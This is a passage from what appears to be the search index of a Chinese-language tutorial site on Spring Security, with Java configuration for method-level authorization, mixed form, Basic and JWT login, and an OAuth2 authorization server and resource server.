}\n}\n</code></pre>"},{"location":"auth/05-SpringSecurity%E5%AE%9E%E6%88%98%E9%85%8D%E7%BD%AE/#postauthorize","title":"@PostAuthorize\u6ce8\u89e3","text":"<pre><code>/**\n * \u65b9\u6cd5\u6267\u884c\u540e\u8fdb\u884c\u6743\u9650\u68c0\u67e5\n */\n@Service\npublic class DocumentService {\n\n    /**\n     * \u8fd4\u56de\u7ed3\u679c\u540e\u68c0\u67e5\u6743\u9650\n     * \u5982\u679c\u8fd4\u56de\u7684\u6587\u6863\u4e0d\u5c5e\u4e8e\u5f53\u524d\u7528\u6237\uff0c\u629b\u51faAccessDeniedException\n     */\n    @PostAuthorize(\"returnObject.owner == authentication.name\")\n    public Document getDocument(Long id) {\n        return documentRepository.findById(id).orElseThrow();\n    }\n\n    /**\n     * \u8fc7\u6ee4\u8fd4\u56de\u7684\u96c6\u5408\uff0c\u53ea\u4fdd\u7559\u7528\u6237\u6709\u6743\u8bbf\u95ee\u7684\u9879\n     */\n    @PostFilter(\"filterObject.owner == authentication.name or hasRole('ADMIN')\")\n    public List&lt;Document&gt; getDocuments() {\n        return documentRepository.findAll();\n    }\n}\n</code></pre>"},{"location":"auth/05-SpringSecurity%E5%AE%9E%E6%88%98%E9%85%8D%E7%BD%AE/#securedrolesallowed","title":"@Secured\u548c@RolesAllowed\u6ce8\u89e3","text":"<pre><code>@Service\npublic class ProductService {\n\n    /**\n     * @Secured\u6ce8\u89e3\uff08\u7b80\u5355\u89d2\u8272\u68c0\u67e5\uff09\n     */\n    @Secured(\"ROLE_ADMIN\")\n    public void deleteProduct(Long id) {\n        productRepository.deleteById(id);\n    }\n\n    @Secured({\"ROLE_ADMIN\", \"ROLE_MANAGER\"})\n    public Product updateProduct(Product product) {\n        return productRepository.save(product);\n    }\n\n    /**\n     * @RolesAllowed\u6ce8\u89e3\uff08JSR-250\u6807\u51c6\uff09\n     */\n    @RolesAllowed(\"ADMIN\")\n    public List&lt;Product&gt; getAllProducts() {\n        return productRepository.findAll();\n    }\n}\n</code></pre>"},{"location":"auth/05-SpringSecurity%E5%AE%9E%E6%88%98%E9%85%8D%E7%BD%AE/#_17","title":"\u591a\u79cd\u8ba4\u8bc1\u65b9\u5f0f\u7ec4\u5408","text":""},{"location":"auth/05-SpringSecurity%E5%AE%9E%E6%88%98%E9%85%8D%E7%BD%AE/#jwt","title":"\u540c\u65f6\u652f\u6301\u8868\u5355\u767b\u5f55\u548cJWT","text":"<pre><code>@Configuration\n@EnableWebSecurity\npublic class MultiAuthConfig {\n\n    @Autowired\n    private JwtAuthenticationFilter jwtAuthenticationFilter;\n\n    @Autowired\n    private UserDetailsService userDetailsService;\n\n    @Bean\n    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\n        http\n            .authorizeHttpRequests(authz -&gt; authz\n                .requestMatchers(\"/\", \"/login\", \"/register\").permitAll()\n                .requestMatchers(\"/api/auth/**\").permitAll()\n                .requestMatchers(\"/api/**\").authenticated()\n                .anyRequest().authenticated()\n            )\n\n            // \u8868\u5355\u767b\u5f55\uff08\u7528\u4e8eWeb\u9875\u9762\uff09\n            .formLogin(form -&gt; form\n                .loginPage(\"/login\")\n                .defaultSuccessUrl(\"/dashboard\")\n                .permitAll()\n            )\n\n            // JWT\u8ba4\u8bc1\uff08\u7528\u4e8eAPI\uff09\n            .addFilterBefore(jwtAuthenticationFilter, \n                            UsernamePasswordAuthenticationFilter.class)\n\n            // \u4f1a\u8bdd\u7ba1\u7406\n            .sessionManagement(session -&gt; session\n                // API\u4f7f\u7528\u65e0\u72b6\u6001\uff0cWeb\u4f7f\u7528\u6709\u72b6\u6001\n                .sessionCreationPolicy(SessionCreationPolicy.IF_REQUIRED)\n            )\n\n            // CSRF\uff1aAPI\u7981\u7528\uff0cWeb\u542f\u7528\n            .csrf(csrf -&gt; csrf\n                .ignoringRequestMatchers(\"/api/**\")\n            );\n\n        return http.build();\n    }\n}\n</code></pre>"},{"location":"auth/05-SpringSecurity%E5%AE%9E%E6%88%98%E9%85%8D%E7%BD%AE/#basicbearer-token","title":"\u540c\u65f6\u652f\u6301Basic\u548cBearer Token","text":"<pre><code>@Configuration\npublic class MultiTokenAuthConfig {\n\n    @Bean\n    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\n        http\n            .authorizeHttpRequests(authz -&gt; authz\n                .anyRequest().authenticated()\n            )\n\n            // HTTP Basic\u8ba4\u8bc1\n            .httpBasic(Customizer.withDefaults())\n\n            // OAuth2\u8d44\u6e90\u670d\u52a1\u5668\uff08Bearer Token\uff09\n            .oauth2ResourceServer(oauth2 -&gt; oauth2\n                .jwt(Customizer.withDefaults())\n            )\n\n            .csrf().disable();\n\n        return http.build();\n    }\n}\n</code></pre>"},{"location":"auth/05-SpringSecurity%E5%AE%9E%E6%88%98%E9%85%8D%E7%BD%AE/#_18","title":"\u603b\u7ed3","text":"<p>\u672c\u7ae0\u4ecb\u7ecd\u4e86Spring Security\u7684\u5404\u79cd\u5b9e\u6218\u914d\u7f6e\uff1a</p> <ol> <li>\u8868\u5355\u767b\u5f55\uff1a\u81ea\u5b9a\u4e49\u767b\u5f55\u9875\u3001\u6210\u529f/\u5931\u8d25\u5904\u7406\u5668</li> <li>HTTP Basic\uff1aAPI\u8ba4\u8bc1\u7684\u57fa\u7840\u65b9\u5f0f</li> <li>Remember-Me\uff1a\u63d0\u5347\u7528\u6237\u4f53\u9a8c\u7684\u8bb0\u4f4f\u6211\u529f\u80fd</li> <li>\u4f1a\u8bdd\u7ba1\u7406\uff1a\u5e76\u53d1\u63a7\u5236\u3001\u8d85\u65f6\u8bbe\u7f6e\u3001\u5728\u7ebf\u7528\u6237\u7ba1\u7406</li> <li>CSRF\u9632\u62a4\uff1a\u4fdd\u62a4\u5e94\u7528\u514d\u53d7\u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020\u653b\u51fb</li> <li>\u65b9\u6cd5\u7ea7\u5b89\u5168\uff1a\u7ec6\u7c92\u5ea6\u7684\u6743\u9650\u63a7\u5236</li> <li>\u591a\u79cd\u8ba4\u8bc1\u65b9\u5f0f\uff1a\u7075\u6d3b\u7ec4\u5408\u4e0d\u540c\u7684\u8ba4\u8bc1\u673a\u5236</li> </ol> <p>\u7ee7\u7eed\u5b66\u4e60\uff1a - \u4e0a\u4e00\u7ae0\uff1aSpring Security\u6838\u5fc3\u67b6\u6784 - \u4e0b\u4e00\u7ae0\uff1aSpring Security OAuth2\u96c6\u6210</p>"},{"location":"auth/06-SpringSecurity-OAuth2/","title":"Spring Security OAuth2\u96c6\u6210","text":""},{"location":"auth/06-SpringSecurity-OAuth2/#_1","title":"\u76ee\u5f55","text":"<ul> <li>OAuth2\u67b6\u6784\u6982\u89c8</li> <li>\u6388\u6743\u670d\u52a1\u5668\u914d\u7f6e</li> <li>\u8d44\u6e90\u670d\u52a1\u5668\u914d\u7f6e</li> <li>OAuth2\u5ba2\u6237\u7aef\u914d\u7f6e</li> <li>JWT Token\u914d\u7f6e</li> <li>OAuth2\u4e0eSpring Security\u96c6\u6210</li> <li>\u5b9e\u6218\u6848\u4f8b</li> </ul>"},{"location":"auth/06-SpringSecurity-OAuth2/#oauth2","title":"OAuth2\u67b6\u6784\u6982\u89c8","text":""},{"location":"auth/06-SpringSecurity-OAuth2/#spring-security-oauth2_1","title":"Spring Security OAuth2\u7ec4\u4ef6","text":"<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502         Spring Security OAuth2 Architecture           \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                       \u2502\n\u2502  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510    \u2502\n\u2502  \u2502      Authorization Server (\u6388\u6743\u670d\u52a1\u5668)       \u2502    \u2502\n\u2502  \u2502  \u2022 \u7528\u6237\u8ba4\u8bc1                                  \u2502    \u2502\n\u2502  \u2502  \u2022 \u6388\u6743\u7ba1\u7406                                  \u2502    \u2502\n\u2502  \u2502  \u2022 Token\u9881\u53d1                                 \u2502    \u2502\n\u2502  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518    \u2502\n\u2502                       \u2502                              \u2502\n\u2502                       \u2502 Token                        \u2502\n\u2502                       \u25bc                              \u2502\n\u2502  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510    \u2502\n\u2502  \u2502      Resource Server (\u8d44\u6e90\u670d\u52a1\u5668)           \u2502    \u2502\n\u2502  \u2502  \u2022 Token\u9a8c\u8bc1                                 \u2502    \u2502\n\u2502  \u2502  \u2022 \u8d44\u6e90\u4fdd\u62a4                                  \u2502    \u2502\n\u2502  \u2502  \u2022 \u6743\u9650\u68c0\u67e5                                  \u2502    \u2502\n\u2502  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518    \u2502\n\u2502                       \u25b2                              \u2502\n\u2502                       \u2502 API Request                  \u2502\n\u2502                       \u2502                              \u2502\n\u2502  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510    \u2502\n\u2502  \u2502      OAuth2 Client (\u5ba2\u6237\u7aef)                 \u2502    \u2502\n\u2502  \u2502  \u2022 \u83b7\u53d6\u6388\u6743                                  \u2502    \u2502\n\u2502  \u2502  \u2022 Token\u7ba1\u7406                                 \u2502    \u2502\n\u2502  \u2502  \u2022 \u8c03\u7528\u53d7\u4fdd\u62a4\u8d44\u6e90                            \u2502    \u2502\n\u2502  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518    \u2502\n\u2502                                                       \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"auth/06-SpringSecurity-OAuth2/#maven","title":"Maven\u4f9d\u8d56","text":"<pre><code>&lt;!-- Spring Boot 3.x --&gt;\n&lt;dependencies&gt;\n    &lt;!-- Spring Security --&gt;\n    &lt;dependency&gt;\n        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\n        &lt;artifactId&gt;spring-boot-starter-security&lt;/artifactId&gt;\n    &lt;/dependency&gt;\n\n    &lt;!-- OAuth2\u6388\u6743\u670d\u52a1\u5668 --&gt;\n    &lt;dependency&gt;\n        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\n        &lt;artifactId&gt;spring-boot-starter-oauth2-authorization-server&lt;/artifactId&gt;\n    &lt;/dependency&gt;\n\n    &lt;!-- OAuth2\u8d44\u6e90\u670d\u52a1\u5668 --&gt;\n    &lt;dependency&gt;\n        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\n        &lt;artifactId&gt;spring-boot-starter-oauth2-resource-server&lt;/artifactId&gt;\n    &lt;/dependency&gt;\n\n    &lt;!-- OAuth2\u5ba2\u6237\u7aef --&gt;\n    &lt;dependency&gt;\n        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\n        &lt;artifactId&gt;spring-boot-starter-oauth2-client&lt;/artifactId&gt;\n    &lt;/dependency&gt;\n\n    &lt;!-- JWT\u652f\u6301 --&gt;\n    &lt;dependency&gt;\n        &lt;groupId&gt;org.springframework.security&lt;/groupId&gt;\n        &lt;artifactId&gt;spring-security-oauth2-jose&lt;/artifactId&gt;\n    &lt;/dependency&gt;\n&lt;/dependencies&gt;\n</code></pre>"},{"location":"auth/06-SpringSecurity-OAuth2/#_2","title":"\u6388\u6743\u670d\u52a1\u5668\u914d\u7f6e","text":""},{"location":"auth/06-SpringSecurity-OAuth2/#_3","title":"\u57fa\u7840\u6388\u6743\u670d\u52a1\u5668","text":"<pre><code>/**\n * OAuth2\u6388\u6743\u670d\u52a1\u5668\u914d\u7f6e\n * Spring Authorization Server (\u65b0\u7248\u672c)\n */\n@Configuration\npublic class AuthorizationServerConfig {\n\n    /**\n     * \u6388\u6743\u670d\u52a1\u5668\u5b89\u5168\u914d\u7f6e\n     */\n    @Bean\n    @Order(1)\n    public SecurityFilterChain authorizationServerSecurityFilterChain(HttpSecurity http) \n            throws Exception {\n\n        OAuth2AuthorizationServerConfiguration.applyDefaultSecurity(http);\n\n        http\n            .getConfigurer(OAuth2AuthorizationServerConfigurer.class)\n            .oidc(Customizer.withDefaults());  // \u542f\u7528OpenID Connect\n\n        http\n            .exceptionHandling(exceptions -&gt; exceptions\n                .authenticationEntryPoint(\n                    new LoginUrlAuthenticationEntryPoint(\"/login\")\n                )\n            )\n            .oauth2ResourceServer(oauth2 -&gt; oauth2\n                .jwt(Customizer.withDefaults())\n            );\n\n        return http.build();\n    }\n\n    /**\n     * \u9ed8\u8ba4\u5b89\u5168\u914d\u7f6e\n     */\n    @Bean\n    @Order(2)\n    public SecurityFilterChain defaultSecurityFilterChain(HttpSecurity http) \n            throws Exception {\n        http\n            .authorizeHttpRequests(authorize -&gt; authorize\n                .anyRequest().authenticated()\n            )\n            .formLogin(Customizer.withDefaults());\n\n        return http.build();\n    }\n\n    /**\n     * \u6ce8\u518c\u5ba2\u6237\u7aef\n     */\n    @Bean\n    public RegisteredClientRepository registeredClientRepository() {\n        // \u5ba2\u6237\u7aef1\uff1a\u6388\u6743\u7801\u6a21\u5f0f\n        RegisteredClient authorizationCodeClient = RegisteredClient.withId(UUID.randomUUID().toString())\n            .clientId(\"client-app\")\n            .clientSecret(\"{noop}secret\")  // {noop}\u8868\u793a\u4e0d\u52a0\u5bc6\uff08\u6d4b\u8bd5\u7528\uff09\n            .clientAuthenticationMethod(ClientAuthenticationMethod.CLIENT_SECRET_BASIC)\n            .authorizationGrantType(AuthorizationGrantType.AUTHORIZATION_CODE)\n            .authorizationGrantType(AuthorizationGrantType.REFRESH_TOKEN)\n            .redirectUri(\"http://127.0.0.1:8080/login/oauth2/code/client-app\")\n            .redirectUri(\"http://127.0.0.1:8080/authorized\")\n            .scope(OidcScopes.OPENID)\n            .scope(OidcScopes.PROFILE)\n            .scope(\"read\")\n            .scope(\"write\")\n            .clientSettings(ClientSettings.builder()\n                .requireAuthorizationConsent(true)  // \u9700\u8981\u7528\u6237\u540c\u610f\n                .build())\n            .tokenSettings(TokenSettings.builder()\n                .accessTokenTimeToLive(Duration.ofHours(1))\n                .refreshTokenTimeToLive(Duration.ofDays(7))\n                .reuseRefreshTokens(false)\n                .build())\n            .build();\n\n        // \u5ba2\u6237\u7aef2\uff1a\u5ba2\u6237\u7aef\u51ed\u8bc1\u6a21\u5f0f\uff08\u670d\u52a1\u5668\u95f4\u8c03\u7528\uff09\n        RegisteredClient clientCredentialsClient = RegisteredClient.withId(UUID.randomUUID().toString())\n            .clientId(\"service-client\")\n            .clientSecret(\"{noop}service-secret\")\n            .clientAuthenticationMethod(ClientAuthenticationMethod.CLIENT_SECRET_BASIC)\n            .authorizationGrantType(AuthorizationGrantType.CLIENT_CREDENTIALS)\n            .scope(\"api.read\")\n            .scope(\"api.write\")\n            .build();\n\n        // \u4fdd\u5b58\u5230\u5185\u5b58\uff08\u751f\u4ea7\u73af\u5883\u5e94\u4f7f\u7528\u6570\u636e\u5e93\uff09\n        return new InMemoryRegisteredClientRepository(\n            authorizationCodeClient, \n            clientCredentialsClient\n        );\n    }\n\n    /**\n     * JWK\u6e90\uff08\u7528\u4e8eJWT\u7b7e\u540d\uff09\n     */\n    @Bean\n    public JWKSource&lt;SecurityContext&gt; jwkSource() {\n        RSAKey rsaKey = generateRSAKey();\n        JWKSet jwkSet = new JWKSet(rsaKey);\n        return (jwkSelector, securityContext) -&gt; jwkSelector.select(jwkSet);\n    }\n\n    /**\n     * \u751f\u6210RSA\u5bc6\u94a5\u5bf9\n     */\n    private RSAKey generateRSAKey() {\n        KeyPair keyPair = generateRSAKeyPair();\n        RSAPublicKey publicKey = (RSAPublicKey) keyPair.getPublic();\n        RSAPrivateKey privateKey = (RSAPrivateKey) keyPair.getPrivate();\n\n        return new RSAKey.Builder(publicKey)\n            .privateKey(privateKey)\n            .keyID(UUID.randomUUID().toString())\n            .build();\n    }\n\n    private KeyPair generateRSAKeyPair() {\n        try {\n            KeyPairGenerator keyPairGenerator = KeyPairGenerator.getInstance(\"RSA\");\n            keyPairGenerator.initialize(2048);\n            return keyPairGenerator.generateKeyPair();\n        } catch (Exception e) {\n            throw new IllegalStateException(e);\n        }\n    }\n\n    /**\n     * JWT\u89e3\u7801\u5668\n     */\n    @Bean\n    public JwtDecoder jwtDecoder(JWKSource&lt;SecurityContext&gt; jwkSource) {\n        return OAuth2AuthorizationServerConfiguration.jwtDecoder(jwkSource);\n    }\n\n    /**\n     * \u6388\u6743\u670d\u52a1\u5668\u8bbe\u7f6e\n     */\n    @Bean\n    public AuthorizationServerSettings authorizationServerSettings() {\n        return AuthorizationServerSettings.builder()\n            .issuer(\"http://localhost:9000\")  // \u6388\u6743\u670d\u52a1\u5668\u5730\u5740\n            .build();\n    }\n}\n</code></pre>"},{"location":"auth/06-SpringSecurity-OAuth2/#_4","title":"\u6570\u636e\u5e93\u5b58\u50a8\u5ba2\u6237\u7aef","text":"<pre><code>/**\n * \u4f7f\u7528\u6570\u636e\u5e93\u5b58\u50a8\u6ce8\u518c\u5ba2\u6237\u7aef\n */\n@Configuration\npublic class JdbcClientConfig {\n\n    @Bean\n    public RegisteredClientRepository registeredClientRepository(JdbcTemplate jdbcTemplate) {\n        return new JdbcRegisteredClientRepository(jdbcTemplate);\n    }\n\n    /**\n     * \u521d\u59cb\u5316\u5ba2\u6237\u7aef\u6570\u636e\n     */\n    @Bean\n    public CommandLineRunner initClients(RegisteredClientRepository repository) {\n        return args -&gt; {\n            RegisteredClient client = RegisteredClient.withId(UUID.randomUUID().toString())\n                .clientId(\"my-client\")\n                .clientSecret(\"{bcrypt}\" + new BCryptPasswordEncoder().encode(\"secret\"))\n                .clientAuthenticationMethod(ClientAuthenticationMethod.CLIENT_SECRET_BASIC)\n                .authorizationGrantType(AuthorizationGrantType.AUTHORIZATION_CODE)\n                .authorizationGrantType(AuthorizationGrantType.REFRESH_TOKEN)\n                .redirectUri(\"http://127.0.0.1:8080/authorized\")\n                .scope(\"read\")\n                .scope(\"write\")\n                .build();\n\n            repository.save(client);\n        };\n    }\n}\n</code></pre> <p>\u6570\u636e\u5e93\u8868\u7ed3\u6784\uff08Spring\u63d0\u4f9b\u7684schema\uff09\uff1a</p> <pre><code>CREATE TABLE oauth2_registered_client (\n    id VARCHAR(100) PRIMARY KEY,\n    client_id VARCHAR(100) NOT NULL,\n    client_id_issued_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP NOT NULL,\n    client_secret VARCHAR(200),\n    client_secret_expires_at TIMESTAMP,\n    client_name VARCHAR(200) NOT NULL,\n    client_authentication_methods VARCHAR(1000) NOT NULL,\n    authorization_grant_types VARCHAR(1000) NOT NULL,\n    redirect_uris VARCHAR(1000),\n    scopes VARCHAR(1000) NOT NULL,\n    client_settings VARCHAR(2000) NOT NULL,\n    token_settings VARCHAR(2000) NOT NULL,\n    UNIQUE KEY uk_client_id (client_id)\n);\n\nCREATE TABLE oauth2_authorization (\n    id VARCHAR(100) PRIMARY KEY,\n    registered_client_id VARCHAR(100) NOT NULL,\n    principal_name VARCHAR(200) NOT NULL,\n    authorization_grant_type VARCHAR(100) NOT NULL,\n    authorized_scopes VARCHAR(1000),\n    attributes TEXT,\n    state VARCHAR(500),\n    authorization_code_value TEXT,\n    authorization_code_issued_at TIMESTAMP,\n    authorization_code_expires_at TIMESTAMP,\n    authorization_code_metadata TEXT,\n    access_token_value TEXT,\n    access_token_issued_at TIMESTAMP,\n    access_token_expires_at TIMESTAMP,\n    access_token_metadata TEXT,\n    access_token_type VARCHAR(100),\n    access_token_scopes VARCHAR(1000),\n    oidc_id_token_value TEXT,\n    oidc_id_token_issued_at TIMESTAMP,\n    oidc_id_token_expires_at TIMESTAMP,\n    oidc_id_token_metadata TEXT,\n    refresh_token_value TEXT,\n    refresh_token_issued_at TIMESTAMP,\n    refresh_token_expires_at TIMESTAMP,\n    refresh_token_metadata TEXT\n);\n\nCREATE TABLE oauth2_authorization_consent (\n    registered_client_id VARCHAR(100) NOT NULL,\n    principal_name VARCHAR(200) NOT NULL,\n    authorities VARCHAR(1000) NOT NULL,\n    PRIMARY KEY (registered_client_id, principal_name)\n);\n</code></pre>"},{"location":"auth/06-SpringSecurity-OAuth2/#token","title":"\u81ea\u5b9a\u4e49Token\u589e\u5f3a","text":"<pre><code>/**\n * \u81ea\u5b9a\u4e49JWT Token\u5185\u5bb9\n */\n@Component\npublic class CustomTokenCustomizer implements OAuth2TokenCustomizer&lt;JwtEncodingContext&gt; {\n\n    @Autowired\n    private UserRepository userRepository;\n\n    @Override\n    public void customize(JwtEncodingContext context) {\n        if (context.getTokenType().getValue().equals(\"access_token\")) {\n            // \u83b7\u53d6\u7528\u6237\u4fe1\u606f\n            Authentication principal = context.getPrincipal();\n            String username = principal.getName();\n\n            User user = userRepository.findByUsername(username).orElse(null);\n\n            if (user != null) {\n                // \u6dfb\u52a0\u81ea\u5b9a\u4e49\u58f0\u660e\n                context.getClaims()\n                    .claim(\"user_id\", user.getId())\n                    .claim(\"email\", user.getEmail())\n                    .claim(\"department\", user.getDepartment())\n                    .claim(\"roles\", user.getRoles().stream()\n                        .map(Role::getName)\n                        .collect(Collectors.toList()));\n            }\n        }\n    }\n}\n\n/**\n * \u6ce8\u518cToken\u81ea\u5b9a\u4e49\u5668\n */\n@Configuration\npublic class TokenConfig {\n\n    @Bean\n    public OAuth2TokenGenerator&lt;?&gt; tokenGenerator(JWKSource&lt;SecurityContext&gt; jwkSource,\n                                                  OAuth2TokenCustomizer&lt;JwtEncodingContext&gt; tokenCustomizer) {\n        JwtGenerator jwtGenerator = new JwtGenerator(new NimbusJwtEncoder(jwkSource));\n        jwtGenerator.setJwtCustomizer(tokenCustomizer);\n\n        OAuth2AccessTokenGenerator accessTokenGenerator = new OAuth2AccessTokenGenerator();\n        OAuth2RefreshTokenGenerator refreshTokenGenerator = new OAuth2RefreshTokenGenerator();\n\n        return new DelegatingOAuth2TokenGenerator(\n            jwtGenerator, \n            accessTokenGenerator, \n            refreshTokenGenerator\n        );\n    }\n}\n</code></pre>"},{"location":"auth/06-SpringSecurity-OAuth2/#_5","title":"\u8d44\u6e90\u670d\u52a1\u5668\u914d\u7f6e","text":""},{"location":"auth/06-SpringSecurity-OAuth2/#_6","title":"\u57fa\u7840\u8d44\u6e90\u670d\u52a1\u5668","text":"<pre><code>/**\n * OAuth2\u8d44\u6e90\u670d\u52a1\u5668\u914d\u7f6e\n */\n@Configuration\n@EnableWebSecurity\npublic class ResourceServerConfig {\n\n    @Bean\n    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {\n        http\n            .authorizeHttpRequests(authz -&gt; authz\n                .requestMatchers(\"/api/public/**\").permitAll()\n                .requestMatchers(\"/api/admin/**\").hasRole(\"ADMIN\")\n                .requestMatchers(\"/api/**\").authenticated()\n            )\n            .oauth2ResourceServer(oauth2 -&gt; oauth2\n                .jwt(jwt -&gt; jwt\n                    .jwtAuthenticationConverter(jwtAuthenticationConverter())\n                )\n            )\n            .csrf().disable();\n\n        return http.build();\n    }\n\n    /**\n     * JWT\u8ba4\u8bc1\u8f6c\u6362\u5668\n     * \u5c06JWT\u4e2d\u7684\u4fe1\u606f\u8f6c\u6362\u4e3aSpring Security\u7684Authentication\n     */\n    @Bean\n    public JwtAuthenticationConverter jwtAuthenticationConverter() {\n        JwtGrantedAuthoritiesConverter grantedAuthoritiesConverter = \n            new JwtGrantedAuthoritiesConverter();\n\n        // \u4eceJWT\u7684\"roles\"\u5b57\u6bb5\u63d0\u53d6\u89d2\u8272\n        grantedAuthoritiesConverter.setAuthoritiesClaimName(\"roles\");\n        // \u6dfb\u52a0\"ROLE_\"\u524d\u7f00\n        grantedAuthoritiesConverter.setAuthorityPrefix(\"ROLE_\");\n\n        JwtAuthenticationConverter jwtAuthenticationConverter = \n            new JwtAuthenticationConverter();\n        jwtAuthenticationConverter.setJwtGrantedAuthoritiesConverter(grantedAuthoritiesConverter);\n\n        return jwtAuthenticationConverter;\n    }\n\n    /**\n     * JWT\u89e3\u7801\u5668\u914d\u7f6e\n     */\n    @Bean\n    public JwtDecoder jwtDecoder() {\n        // \u65b9\u5f0f1: \u4f7f\u7528\u6388\u6743\u670d\u52a1\u5668\u7684JWK Set URI\n        return JwtDecoders.fromIssuerLocation(\"http://localhost:9000\");\n\n        // \u65b9\u5f0f2: \u4f7f\u7528\u516c\u94a5\n        // return NimbusJwtDecoder.withPublicKey(publicKey).build();\n\n        // \u65b9\u5f0f3: \u4f7f\u7528\u5bf9\u79f0\u5bc6\u94a5\uff08HMAC\uff09\n        // SecretKey key = new SecretKeySpec(\"secret\".getBytes(), \"HmacSHA256\");\n        // return NimbusJwtDecoder.withSecretKey(key).build();\n    }\n}\n</code></pre>"},{"location":"auth/06-SpringSecurity-OAuth2/#applicationyml","title":"application.yml\u914d\u7f6e","text":"<pre><code>spring:\n  security:\n    oauth2:\n      resourceserver:\n        jwt:\n          # \u6388\u6743\u670d\u52a1\u5668\u7684JWK Set URI\n          jwk-set-uri: http://localhost:9000/oauth2/jwks\n          # \u6216\u4f7f\u7528issuer-uri\uff08\u81ea\u52a8\u53d1\u73b0JWK Set URI\uff09\n          issuer-uri: http://localhost:9000\n</code></pre>"},{"location":"auth/06-SpringSecurity-OAuth2/#jwt","title":"\u81ea\u5b9a\u4e49JWT\u9a8c\u8bc1","text":"<pre><code>/**\n * \u81ea\u5b9a\u4e49JWT\u9a8c\u8bc1\u5668\n */\n@Component\npublic class CustomJwtValidator implements OAuth2TokenValidator&lt;Jwt&gt; {\n\n    @Override\n    public OAuth2TokenValidatorResult validate(Jwt jwt) {\n        List&lt;OAuth2Error&gt; errors = new ArrayList&lt;&gt;();\n\n        // 1. \u9a8c\u8bc1audience\n        List&lt;String&gt; audience = jwt.getAudience();\n        if (audience == null || !audience.contains(\"my-resource-server\")) {\n            errors.add(new OAuth2Error(\"invalid_token\", \"Invalid audience\", null));\n        }\n\n        // 2. \u9a8c\u8bc1\u81ea\u5b9a\u4e49\u58f0\u660e\n        String userId = jwt.getClaimAsString(\"user_id\");\n        if (userId == null) {\n            errors.add(new OAuth2Error(\"invalid_token\", \"Missing user_id claim\", null));\n        }\n\n        // 3. \u5176\u4ed6\u81ea\u5b9a\u4e49\u9a8c\u8bc1...\n\n        return errors.isEmpty() ? \n            OAuth2TokenValidatorResult.success() : \n            OAuth2TokenValidatorResult.failure(errors);\n    }\n}\n\n/**\n * \u914d\u7f6e\u81ea\u5b9a\u4e49\u9a8c\u8bc1\u5668\n */\n@Configuration\npublic class JwtConfig {\n\n    @Autowired\n    private CustomJwtValidator customJwtValidator;\n\n    @Bean\n    public JwtDecoder jwtDecoder() {\n        NimbusJwtDecoder jwtDecoder = 